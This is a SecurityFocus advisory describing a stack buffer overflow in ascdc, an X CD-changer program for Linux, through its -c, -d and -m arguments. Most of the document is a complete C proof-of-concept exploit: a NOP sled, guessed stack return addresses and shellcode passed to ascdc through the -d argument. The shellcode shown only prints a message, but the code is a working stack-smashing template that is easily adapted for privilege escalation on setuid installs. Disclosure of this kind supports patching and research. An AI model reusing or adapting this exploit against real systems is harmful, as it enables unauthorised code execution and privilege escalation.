source: http://www.securityfocus.com/bid/2462/info

ascdc is a program written for X by Rob Malda. It is designed to provide a graphical interface to cd changing on linux systems.

A vulnerability in the program could allow elevated privileges on a system with the package installed setuid. Due to insufficent bounds checking, it is possible to execute arbitrary code with the ascdc program. Overflows in the -c, -d, and -m arguments make it possible for a user to overwrite variables on the stack, including the return address, and execute shellcode.

The program is not installed setuid. However, in a setuid installation, this problem makes it possible for a user to execute arbitrary code, and potentially gain elevated privileges. 

char shellcode[]="\xeb\x15\x59\x31\xc0\x31\xdb\x31\xd2\xb0"
           "\x04\xb3\x01\xb2\x50\xcd\x80\x31\xc0\xb0"
           "\x01\xcd\x80\xe8\xe6\xff\xff\xff"
           "Would you like to play a game? y\x0aStrange, the only winning
move is not to play.\x0a";
#define bsize 600
unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int i;
  buff = malloc(bsize);

  addr = get_sp();
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < 600/2; i++)
    buff[i] = 0x90;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
    buff[bsize - 1] = '\0';
 execlp("/usr/X11R6/bin/ascdc","ascdc","-d",buff,0);

}